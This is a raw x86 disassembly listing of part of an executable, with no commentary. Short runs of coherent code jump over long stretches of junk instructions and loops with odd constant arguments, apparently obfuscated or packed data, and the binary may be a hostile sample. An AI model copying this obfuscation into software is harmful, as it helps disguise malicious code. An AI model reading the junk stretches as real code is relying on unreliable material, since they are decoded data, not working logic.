  40ae92:	mov    eax,DWORD PTR [ebp+0xc]
  40ae95:	mov    eax,DWORD PTR [eax+0x78]
  40ae98:	mov    DWORD PTR [ebp+0xc],eax
  40ae9b:	mov    eax,DWORD PTR [ebp-0x4]
  40ae9e:	mov    esi,DWORD PTR [ebp-0x8]
  40aea1:	jmp    0x40b09c
  40aea6:	aad    0xc4
  40aea8:	outs   dx,DWORD PTR ds:[esi]
  40aea9:	mov    BYTE PTR [edi-0x53],ch
  40aeac:	std    
  40aead:	jge    0x40af09
  40aeaf:	outs   dx,DWORD PTR ds:[esi]
  40aeb0:	stos   DWORD PTR es:[edi],eax
  40aeb1:	lock sbb ebp,DWORD PTR [edi-0x1f40fcff]
  40aeb8:	jle    0x40af38
  40aeba:	pop    esp
  40aebb:	jg     0x40af3b
  40aebd:	jle    0x40af3c
  40aebf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec0:	sahf   
  40aec1:	pop    ebp
  40aec2:	adc    BYTE PTR [edx],cl
  40aec4:	sbb    eax,0x71e1744e
  40aec9:	fistp  QWORD PTR [ecx]
  40aecb:	jl     0x40aeff
  40aecd:	mov    cl,0xe4
  40aecf:	dec    ecx
  40aed0:	sbb    eax,0x5d9ea247
  40aed5:	sbb    al,0xd5
  40aed7:	jno    0x40aee8
  40aed9:	pop    es
  40aeda:	xor    cl,dh
  40aedc:	in     al,dx
  40aedd:	in     eax,dx
  40aede:	fs ror edx,cl
  40aee1:	(bad)  
  40aee2:	stc    
  40aee3:	adc    bl,BYTE PTR [ebx]
  40aee5:	xor    BYTE PTR [edi+0x10a3cb41],bl
  40aeeb:	movlps xmm7,QWORD PTR [edx+0x696ec55d]
  40aef2:	xor    DWORD PTR [bp+si],eax
  40aef5:	mov    WORD PTR [edx],?
  40aef7:	in     al,dx
  40aef8:	in     al,dx
  40aef9:	add    eax,0xcc47b8df
  40aefe:	push   0x63
  40af00:	and    ebx,DWORD PTR ds:0xb3e5abf5
  40af06:	xor    esi,esi
  40af08:	xchg   ebx,eax
  40af09:	push   esi
  40af0a:	jmp    0x90344f0b
  40af0f:	jo     0x40aeb5
  40af11:	pop    ss
  40af12:	rcl    BYTE PTR [ebx-0x15],1
  40af15:	into   
  40af16:	sbb    esi,DWORD PTR [esi]
  40af18:	add    al,0x10
  40af1a:	add    BYTE PTR [ecx+0x47],dh
  40af1d:	test   al,0x57
  40af1f:	dec    edi
  40af20:	fdiv   QWORD PTR [esi]
  40af22:	pop    ebx
  40af23:	jns    0x40af88
  40af25:	mov    dh,0x7b
  40af27:	pop    ss
  40af28:	or     BYTE PTR [edx-0x6fb11f7],ah
  40af2e:	fwait
  40af2f:	cmp    DWORD PTR [ebx+0x7af2cb79],eax
  40af35:	push   edx
  40af36:	push   ecx
  40af37:	test   eax,0x1e81e996
  40af3c:	xchg   cl,al
  40af3e:	data16 (bad) 
  40af40:	out    dx,al
  40af41:	ins    BYTE PTR es:[edi],dx
  40af42:	mov    dh,0xed
  40af44:	fwait
  40af45:	shl    BYTE PTR [edi-0x25],1
  40af48:	push   0x58
  40af4a:	(bad)  
  40af4b:	call   0xd7505030
  40af50:	int    0x3a
  40af52:	sti    
  40af53:	add    dh,BYTE PTR es:[edi]
  40af56:	(bad)  
  40af58:	jno    0x40af36
  40af5a:	xchg   ecx,eax
  40af5b:	std    
  40af5c:	add    ah,BYTE PTR [edi]
  40af5e:	jg     0x40afa5
  40af60:	jo     0x40af88
  40af62:	js     0x40aefb
  40af64:	mov    DWORD PTR ds:0xfc389b3d,ebx
  40af6a:	sub    al,0xb5
  40af6c:	sub    BYTE PTR [ebx],dh
  40af6e:	mov    ds:0x37b8a86e,eax
  40af73:	cs inc ebx
  40af75:	out    0xf0,eax
  40af77:	and    eax,0x3b5506bd
  40af7c:	mov    WORD PTR [edi],?
  40af7e:	xchg   DWORD PTR [edi+edx*8-0x55],ebp
  40af82:	add    esi,DWORD PTR [edi+0x4f]
  40af85:	mov    ebp,0x8310ce55
  40af8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af8b:	xor    BYTE PTR [ebp-0x71de3d15],ch
  40af91:	and    BYTE PTR [ebx-0x49],dl
  40af94:	pop    ds
  40af95:	xchg   edx,eax
  40af96:	xchg   BYTE PTR [edx],bl
  40af98:	out    dx,eax
  40af99:	ss sbb eax,ebx
  40af9c:	icebp  
  40af9d:	clc    
  40af9e:	pop    edi
  40af9f:	xlat   BYTE PTR ds:[ebx]
  40afa0:	pushf  
  40afa1:	lds    ecx,FWORD PTR [ecx-0x54]
  40afa4:	and    BYTE PTR [edx],0x18
  40afa7:	add    DWORD PTR [eax-0x5bc82129],esi
  40afad:	sti    
  40afae:	cld    
  40afaf:	imul   ebx,DWORD PTR [esi],0xd5ed7a4c
  40afb5:	clc    
  40afb6:	mov    dl,0x3e
  40afb8:	(bad)  
  40afba:	sar    BYTE PTR [ecx+0x64],1
  40afbd:	sub    eax,0xbb064eae
  40afc2:	sub    al,BYTE PTR es:[esi]
  40afc5:	sub    edx,DWORD PTR [edx]
  40afc7:	or     ah,al
  40afc9:	das    
  40afca:	mov    ds:0x5e6e2fc9,al
  40afcf:	lock push edx
  40afd1:	xchg   ecx,eax
  40afd3:	loop   0x40b000
  40afd5:	shl    BYTE PTR [ebx-0x7a7f9a95],1
  40afdb:	sub    DWORD PTR [eax+esi*8-0x53],ebp
  40afdf:	cdq    
  40afe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afe1:	dec    ecx
  40afe2:	dec    ebp
  40afe3:	xchg   esp,eax
  40afe4:	jmp    0x40affa
  40afe6:	imul   esp,DWORD PTR [ebp+0x358b40d3],0x7d88b7ff
  40aff0:	pusha  
  40aff1:	mov    ah,BYTE PTR [edi+eax*4+0x25]
  40aff5:	stos   DWORD PTR es:[edi],eax
  40aff6:	iret   
  40aff7:	stos   DWORD PTR es:[edi],eax
  40aff8:	(bad)  
  40aff9:	aad    0x6d
  40affb:	pop    eax
  40affc:	xchg   esi,eax
  40affd:	mov    bh,0x7d
  40afff:	push   es
  40b000:	jne    0x40af83
  40b002:	cmp    bl,al
  40b004:	(bad)  
  40b005:	push   edx
  40b006:	repnz sbb BYTE PTR [ecx+0x371850b5],0x32
  40b00e:	loop   0x40b077
  40b010:	pop    edi
  40b011:	cmp    eax,DWORD PTR [esi]
  40b013:	(bad)  
  40b014:	push   ebx
  40b015:	fist   DWORD PTR [esi]
  40b017:	shl    DWORD PTR [edi+0xd220c4a],0xa
  40b01e:	pop    edi
  40b01f:	in     eax,0x3c
  40b021:	and    esp,DWORD PTR [esi-0x27]
  40b024:	xor    ch,BYTE PTR [ecx-0x35]
  40b027:	mov    eax,0x65029102
  40b02c:	xor    ecx,DWORD PTR [edi]
  40b02e:	(bad)  
  40b02f:	pop    ebp
  40b030:	fcomp  QWORD PTR [ebx-0x4]
  40b033:	shl    DWORD PTR [eax],cl
  40b035:	fisttp QWORD PTR [ebp-0x7fe5df72]
  40b03b:	push   0x47097017
  40b040:	dec    ebx
  40b041:	ss push es
  40b043:	add    al,0xd7
  40b045:	rcl    al,cl
  40b047:	push   edx
  40b048:	ror    BYTE PTR [edi-0x7a4f03b1],1
  40b04e:	out    0x9,al
  40b050:	icebp  
  40b051:	out    dx,al
  40b052:	pop    ds
  40b053:	push   ebx
  40b054:	out    0xed,al
  40b056:	mov    esi,0x51ab76fc
  40b05b:	data16 icebp 
  40b05d:	shr    DWORD PTR [edx-0x2e],0x65
  40b061:	inc    esp
  40b062:	jbe    0x40affe
  40b064:	push   0x72acde02
  40b069:	into   
  40b06a:	fs or  eax,0xa3b12e0a
  40b070:	xchg   esp,eax
  40b071:	lahf   
  40b072:	pushf  
  40b073:	or     eax,0xe60fbac7
  40b078:	jno    0x40b04a
  40b07a:	cmp    BYTE PTR [ebp+0x2382428c],dh
  40b080:	xor    eax,0xbd729150
  40b085:	test   eax,0xaf993dbb
  40b08a:	xchg   ebx,eax
  40b08b:	push   cs
  40b08c:	stos   BYTE PTR es:[edi],al
  40b08d:	lahf   
  40b08e:	(bad)  
  40b090:	inc    ecx
  40b091:	inc    ecx
  40b092:	push   ebp
  40b093:	fld    QWORD PTR [eax]
  40b095:	add    al,0x9d
  40b097:	es or  al,0xd1
  40b09a:	gs jbe 0x40b0d0
  40b09d:	ret    0xf233
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    bl,BYTE PTR [eax-0x62dc0ba0]
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b083
  40b0e6:	lods   eax,DWORD PTR ds:[esi]
  40b0e7:	mov    al,ds:0x7679336d
  40b0ec:	inc    edi
  40b0ed:	fnstenv [ebx-0x73a85a89]
  40b0f3:	mov    ch,0x30
  40b0f5:	and    ecx,ecx
  40b0f7:	cmp    bh,BYTE PTR [edi+0x21797c36]
  40b0fd:	jp     0x40b0c9
  40b0ff:	sbb    al,0x50
  40b101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b102:	cmc    
  40b103:	add    edx,edx
  40b105:	inc    edi
  40b106:	mov    DWORD PTR [ecx+edx*1],edi
  40b109:	rol    BYTE PTR [edx-0x78],1
  40b10c:	push   ecx
  40b10d:	pop    es
  40b10e:	stos   BYTE PTR es:[edi],al
  40b10f:	out    dx,eax
  40b110:	outs   dx,BYTE PTR ds:[esi]
  40b111:	xchg   edx,eax
  40b112:	in     al,dx
  40b113:	adc    ch,ch
  40b115:	je     0x40b0a5
  40b117:	and    al,0xe2
  40b119:	pop    ds
  40b11a:	mov    BYTE PTR [ebx-0x49],dl
  40b11d:	pushf  
  40b11e:	call   0xeeafce65
  40b123:	outs   dx,DWORD PTR ds:[esi]
  40b124:	stc    
  40b125:	push   ebx
  40b126:	mov    edi,0x6efd4a85
  40b12b:	xor    DWORD PTR [eax],edi
  40b12d:	outs   dx,BYTE PTR ds:[esi]
  40b12f:	dec    esi
  40b130:	cmp    edx,DWORD PTR [ebx+0x21]
  40b133:	push   esp
  40b134:	test   BYTE PTR [eax],0xa4
  40b137:	jae    0x40b0be
  40b139:	es inc esi
  40b13b:	push   edi
  40b13c:	aas    
  40b13d:	fsub   st,st(2)
  40b13f:	push   0xffffffaa
  40b141:	xchg   ebp,eax
  40b142:	lods   al,BYTE PTR ds:[esi]
  40b143:	mov    DWORD PTR [ebp+0x2],ebp
  40b146:	sbb    eax,0x9d25e7bf
  40b14b:	mov    edx,0xb3956ab6
  40b150:	sbb    esp,DWORD PTR [edx]
  40b152:	xor    DWORD PTR [eax+0x3f],esp
  40b155:	sub    al,0xdb
  40b157:	sbb    DWORD PTR [ecx+ebp*8],0x0
  40b15b:	jo     0x40b125
  40b15d:	call   0x25ce347c
  40b162:	xchg   ecx,eax
  40b163:	mov    al,ds:0xec71b197
  40b168:	add    dh,BYTE PTR [ebp-0x1068936b]
  40b16e:	push   0xffffffbe
  40b170:	fist   DWORD PTR [ecx+0x6fb87e17]
  40b176:	xchg   edx,eax
  40b177:	loope  0x40b128
  40b179:	fnstsw WORD PTR [edx-0x5d]
  40b17c:	and    bh,al
  40b17e:	push   ecx
  40b17f:	and    edx,esi
  40b181:	adc    BYTE PTR [eax],ch
  40b183:	cwde   
  40b184:	pop    ds
  40b185:	(bad)  
  40b187:	or     dl,BYTE PTR [ecx+0x46]
  40b18a:	xrelease xchg BYTE PTR [edi],al
  40b18d:	sti    
  40b18e:	add    edx,DWORD PTR [edi+0x18ecb2c2]
  40b194:	xor    edx,DWORD PTR [edi]
  40b196:	push   ds
  40b197:	bound  ebx,QWORD PTR ds:0xdd740006
  40b19d:	popf   
  40b19e:	jbe    0x40b20b
  40b1a0:	cmp    eax,0xa0b46215
  40b1a5:	xor    BYTE PTR [ebx+0x47],cl
  40b1a8:	lods   al,BYTE PTR ds:[esi]
  40b1a9:	loop   0x40b190
  40b1ab:	xor    edx,ebx
  40b1ad:	shl    DWORD PTR [edi+0x1c],0xf1
  40b1b1:	in     eax,dx
  40b1b2:	jmp    0xcdfe:0x7eb99f38
  40b1b9:	xchg   ecx,eax
  40b1ba:	sti    
  40b1bb:	inc    edi
  40b1bc:	mov    al,ds:0xc4ce19ae
  40b1c1:	sub    dh,ah
  40b1c3:	ret    0x37c1
  40b1c6:	adc    eax,0xa2654a07
  40b1cb:	mov    eax,ds:0xeb58b0d7
  40b1d0:	shr    ah,cl
  40b1d2:	lods   eax,DWORD PTR ds:[esi]
  40b1d3:	dec    ebx
  40b1d4:	mov    edx,0x95b03c98
  40b1d9:	and    edx,esi
  40b1db:	jnp    0x40b249
  40b1dd:	sahf   
  40b1de:	xchg   edi,eax
  40b1df:	ret    0xab03
  40b1e2:	push   ds
  40b1e3:	inc    edi
  40b1e4:	(bad)  
  40b1e5:	xlat   BYTE PTR ds:[ebx]
  40b1e6:	adc    DWORD PTR [ebx+0xece9b3a],edx
  40b1ec:	mov    ch,0xe8
  40b1ee:	sbb    eax,0x6b42d25d
  40b1f3:	push   ss
  40b1f4:	adc    al,0x9f
  40b1f6:	pop    ebp
  40b1f7:	cs add al,0x4
  40b1fa:	std    
  40b1fb:	pushf  
  40b1fc:	xor    al,0xac
  40b1fe:	adc    eax,0x6239823d
  40b203:	cmp    DWORD PTR [ebx-0x7b],ebx
  40b206:	gs aam 0x1c
  40b209:	jo     0x40b1b9
  40b20b:	xchg   DWORD PTR [ecx+ebx*1],edx
  40b20e:	call   0x14cf:0x494996d8
  40b215:	fsubr  st,st(1)
  40b217:	retf   0x4077
  40b21a:	jbe    0x40b238
  40b21c:	inc    ecx
  40b21d:	int    0xd5
  40b21f:	lods   eax,DWORD PTR ds:[esi]
  40b220:	mov    ah,0x51
  40b222:	jle    0x40b277
  40b224:	in     al,0xd8
  40b226:	outs   dx,BYTE PTR ds:[esi]
  40b227:	xchg   edx,eax
  40b228:	sbb    DWORD PTR [ebx-0x50],ebp
  40b22b:	xchg   ecx,eax
  40b22c:	out    0x1a,al
  40b22e:	or     dh,cl
  40b230:	sbb    DWORD PTR [esi],eax
  40b232:	sub    al,0xc7
  40b234:	or     al,0x34
  40b236:	dec    edx
  40b237:	jb     0x40b281
  40b239:	inc    ecx
  40b23a:	push   ebp
  40b23b:	ud1    ebx,DWORD PTR ds:0x3f65df1c
  40b242:	inc    ebp
  40b243:	dec    esi
  40b244:	mov    ah,0x17
  40b246:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b247:	outs   dx,BYTE PTR ds:[esi]
  40b248:	ret    0x8744
  40b24b:	jmp    0x6cc7:0x910b8030
  40b252:	push   esi
  40b253:	(bad)  
  40b254:	xchg   BYTE PTR [ebx+esi*2-0x79],ah
  40b258:	mov    dl,0x6e
  40b25a:	out    0x52,eax
  40b25c:	imul   ebx,DWORD PTR [esi],0xf2e88841
  40b262:	or     DWORD PTR [si-0x2fb7],edx
  40b267:	xor    DWORD PTR [edi+edi*4],ecx
  40b26a:	mov    dl,0xf
  40b26c:	(bad)  
  40b26d:	and    al,0x5b
  40b26f:	and    ebp,DWORD PTR [ecx+edi*8]
  40b272:	jno    0x40b23b
  40b274:	add    ah,BYTE PTR [edx]
  40b276:	push   ax
  40b278:	pop    es
  40b279:	loop   0x40b2a0
  40b27b:	xor    BYTE PTR [ebx],dh
  40b27d:	rcl    BYTE PTR [esi+edx*1-0x43],0xe0
  40b282:	dec    ecx
  40b283:	xchg   DWORD PTR [edx+0x32529fcf],eax
  40b289:	(bad)  
  40b28a:	sbb    al,0xe9
  40b28c:	jecxz  0x40b217
  40b28e:	dec    edx
  40b28f:	dec    esi
  40b290:	jae    0xf380a941
  40b296:	aaa    
  40b297:	cmp    al,bl
  40b299:	dec    eax
  40b29a:	aas    
  40b29b:	push   0x9dce0c2f
  40b2a0:	mov    edx,0x2707c14a
  40b2a5:	icebp  
  40b2a6:	sbb    BYTE PTR [ebp-0x78b43c39],0xd2
  40b2ad:	mov    bl,0xdb
  40b2af:	ins    BYTE PTR es:[edi],dx
  40b2b0:	jp     0x40b2d0
  40b2b2:	jg     0x40b2ca
  40b2b4:	pusha  
  40b2b5:	adc    eax,0x817b16a1
  40b2ba:	adc    eax,0x8b272ace
  40b2bf:	popa   
  40b2c0:	xchg   edi,eax
  40b2c1:	cmp    al,0xb3
  40b2c3:	pop    esi
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x43066e
  40b2d3:	mov    ecx,DWORD PTR ds:0x43067a
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	test   BYTE PTR [ebx-0x1b042aa1],al
  40b2f6:	jle    0x40b376
  40b2f8:	aas    
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b338
  40b2fd:	pop    ss
  40b2fe:	fdiv   QWORD PTR [edx+ebx*2]
  40b301:	int    0x0
  40b303:	ror    DWORD PTR [ebx-0x5d],1
  40b306:	ins    BYTE PTR es:[edi],dx
  40b307:	(bad)  
  40b308:	bound  ebx,QWORD PTR [ebx]
  40b30a:	outs   dx,DWORD PTR gs:[esi]
  40b30c:	enter  0x42d8,0xb
  40b310:	xor    dl,BYTE PTR [ebx]
  40b312:	pop    ss
  40b313:	cmp    al,0xc2
  40b315:	icebp  
  40b316:	push   es
  40b317:	mov    cl,BYTE PTR [esi-0x3d2c44f6]
  40b31d:	lock fisub WORD PTR [edx+0x4dd90034]
  40b324:	adc    dl,BYTE PTR [esi-0x3a6e38f2]
  40b32a:	mov    ecx,0x74b6de1d
  40b32f:	popf   
  40b330:	jo     0x40b36f
  40b332:	cli    
  40b333:	push   cs
  40b334:	sub    al,0xf9
  40b336:	aaa    
  40b337:	std    
  40b338:	pushf  
  40b339:	sub    ch,BYTE PTR [eax-0x969e780]
  40b33f:	jbe    0x40b2d0
  40b341:	sahf   
  40b342:	pop    esi
  40b343:	jno    0x40b37a
  40b345:	cld    
  40b346:	push   edi
  40b347:	xchg   esp,eax
  40b348:	push   esp
  40b349:	cmp    BYTE PTR [ecx+eiz*2],ah
  40b34c:	aam    0x75
  40b34e:	push   ebx
  40b34f:	out    dx,eax
  40b350:	jp     0x40b2e7
  40b352:	sahf   
  40b353:	or     edi,ecx
  40b355:	mov    WORD PTR ds:0x9430a9cf,fs
  40b35b:	adc    dh,BYTE PTR [edi]
  40b35d:	jecxz  0x40b329
  40b35f:	or     DWORD PTR [edx],ecx
  40b361:	sub    bh,BYTE PTR [ebp+0x39]
  40b364:	cmp    ebx,DWORD PTR [ebx-0x7356229d]
  40b36a:	or     DWORD PTR [esi-0x618ea6f0],ebx
  40b370:	lods   al,BYTE PTR ds:[esi]
  40b371:	mov    bh,0xbb
  40b373:	pop    edi
  40b374:	xor    ecx,ebp
  40b376:	ficomp DWORD PTR [eax]
  40b378:	jo     0x40b32a
  40b37a:	call   0x705d:0x5bf75801
  40b381:	outs   dx,BYTE PTR ds:[esi]
  40b382:	pop    esi
  40b383:	stos   DWORD PTR es:[edi],eax
  40b384:	sbb    al,BYTE PTR [ecx+0x49]
  40b387:	mov    bh,0x8
  40b389:	ss retf 
  40b38b:	dec    eax
  40b38c:	dec    ebx
  40b38d:	fs jl  0x40b3e0
  40b390:	mov    cl,0x74
  40b392:	jb     0x40b316
  40b394:	psadbw mm6,QWORD PTR [ecx-0x64]
  40b398:	xchg   esi,eax
  40b399:	jnp    0x40b32e
  40b39b:	push   ecx
  40b39c:	mov    edx,0xe1ba4d0c
  40b3a1:	or     eax,0x8b5adfef
  40b3a6:	js     0x40b39e
  40b3a8:	mov    eax,0xdf1d01d7
  40b3ad:	cld    
  40b3ae:	and    bh,al
  40b3b0:	nop
  40b3b1:	repnz dec edi
  40b3b3:	jne    0x40b409
  40b3b5:	ficom  DWORD PTR [ecx]
  40b3b7:	stos   BYTE PTR es:[edi],al
  40b3b8:	rcl    DWORD PTR [edx-0x5],1
  40b3bb:	push   ebx
  40b3bc:	jl     0x40b40e
  40b3be:	pusha  
  40b3bf:	cwde   
  40b3c0:	mov    ebx,0x1d0a317f
  40b3c5:	(bad)  
  40b3c6:	fidivr DWORD PTR [edi]
  40b3c8:	adc    al,al
  40b3ca:	mov    edx,0x6c17d8ad
  40b3cf:	cmc    
  40b3d0:	adc    al,0xb3
  40b3d2:	or     esp,ebx
  40b3d4:	adc    ecx,DWORD PTR [ecx]
  40b3d6:	jp     0x40b44d
  40b3d8:	or     al,0x46
  40b3da:	add    DWORD PTR [edi+0x5b],ecx
  40b3dd:	sub    dl,0x0
  40b3e0:	xchg   edx,eax
  40b3e1:	jbe    0x40b3f9
  40b3e3:	in     al,0x7e
  40b3e5:	lds    edx,FWORD PTR [ebx+0x58]
  40b3e8:	cdq    
  40b3e9:	add    BYTE PTR [edx],dl
  40b3eb:	std    
  40b3ec:	mov    bl,0x12
  40b3ee:	pop    esi
  40b3ef:	fimul  WORD PTR [ecx+0x2531b63b]
  40b3f5:	push   esi
  40b3f6:	xchg   edi,eax
  40b3f7:	sub    eax,esp
  40b3f9:	xlat   BYTE PTR ds:[ebx]
  40b3fa:	push   0x5f422dc9
  40b3ff:	cmp    edx,DWORD PTR [esi+0x7bd895e2]
  40b405:	fwait
  40b406:	(bad)  
  40b407:	xchg   ecx,eax
  40b408:	call   0x57eda4c5
  40b40d:	or     dl,BYTE PTR [eax+0x22]
  40b410:	cmp    DWORD PTR [ebx],0x571037d0
  40b416:	cmp    esp,DWORD PTR [esi+0x4ed17a5e]
  40b41c:	(bad)  
  40b41e:	(bad)  
  40b41f:	arpl   WORD PTR [esi],di
  40b421:	mov    eax,esp
  40b423:	int3   
  40b424:	and    eax,0x7db0dd61
  40b429:	push   cs
  40b42a:	xchg   ecx,eax
  40b42b:	push   0x4
  40b42d:	loope  0x40b3c5
  40b42f:	mov    al,0x6
  40b431:	into   
  40b432:	std    
  40b433:	mov    bl,0xb8
  40b435:	sub    dh,bh
  40b437:	xor    eax,ecx
  40b439:	dec    ecx
  40b43a:	pop    esi
  40b43b:	mov    eax,ds:0xfc45c794
  40b440:	xor    eax,0xc7f89c85
  40b445:	add    eax,0x43064e
  40b44a:	adc    DWORD PTR [eax],eax
  40b44c:	add    BYTE PTR [eax],al
  40b44e:	cmp    DWORD PTR ds:0x43064e,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x43064e,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42ebe8
  40b479:	mov    eax,ds:0x43064e
  40b47e:	dec    eax
  40b47f:	mov    ds:0x43064e,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x4305ae,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x430642
  40b4aa:	sbb    DWORD PTR ds:0x42e862,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ef14
  40b4b8:	sub    DWORD PTR ds:0x43058e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x430646,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430596,0x42e86a
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ef1c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e862,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x430646,0x430592
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e85e,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x4305a6,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x4305a6
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x4305a6,edi
  40b536:	cmp    DWORD PTR ds:0x4305a6,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x4305a6,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ef1c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42ebec
  40b560:	cmp    DWORD PTR ds:0x4305a6,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x4305a6
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x4305a6,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430592
  40b591:	xor    DWORD PTR ds:0x4305ba,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x4305be,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430586
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x43063e,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x43063e
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x43063e,edi
  40b5c9:	cmp    DWORD PTR ds:0x43063e,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42ebf0
  40b5f7:	cmp    DWORD PTR ds:0x43063e,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x43063e
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x43063e,edi
  40b613:	cmp    DWORD PTR ds:0x43063e,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x963e4dc4
  40b63f:	pop    ds
  40b640:	jle    0x40b5fe
  40b642:	in     eax,0x7e
  40b644:	jle    0x40b685
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b619
  40b64a:	pop    esp
  40b64b:	ret    0x85e8
  40b64e:	mov    BYTE PTR [edx],cl
  40b650:	int3   
  40b651:	mov    cl,0xb8
  40b653:	dec    ebp
  40b654:	sahf   
  40b655:	jo     0x40b67d
  40b657:	fwait
  40b658:	pushf  
  40b659:	loop   0x40b64e
  40b65b:	mov    esp,0x5b38cfe2
  40b660:	push   ds
  40b661:	dec    edi
  40b662:	sbb    eax,0x64548368
  40b667:	ficom  DWORD PTR [ebx-0x4]
  40b66a:	and    BYTE PTR [eax],ch
  40b66c:	sbb    eax,ebx
  40b66e:	data16 loopne 0x40b647
  40b671:	jae    0x40b65f
  40b673:	sbb    al,0x2f
  40b675:	fwait
  40b676:	cli    
  40b677:	jae    0x40b60b
  40b679:	fcomp  DWORD PTR [edi-0x5d]
  40b67c:	and    BYTE PTR [edi],dl
  40b67e:	cmp    ebp,edx
  40b680:	add    al,0xc4
  40b682:	inc    eax
  40b683:	fwait
  40b684:	mov    WORD PTR [edi-0x27097a60],es
  40b68a:	and    DWORD PTR [ebx+0x443337b7],edx
  40b690:	idiv   ebx
  40b692:	add    bl,ch
  40b694:	adc    eax,0x8ba9893a
  40b699:	xlat   BYTE PTR ds:[ebx]
  40b69a:	sti    
  40b69b:	xlat   BYTE PTR ds:[ebx]
  40b69c:	inc    ebp
  40b69d:	mov    esp,0x8a92a1cc
  40b6a2:	push   esp
  40b6a3:	mov    dh,0xaf
  40b6a5:	add    al,0x7e
  40b6a7:	sub    ecx,eax
  40b6a9:	xor    al,0x58
  40b6ab:	rol    DWORD PTR [ecx+0x7b],1
  40b6ae:	sub    eax,0x8b26b1fd
  40b6b3:	in     al,dx
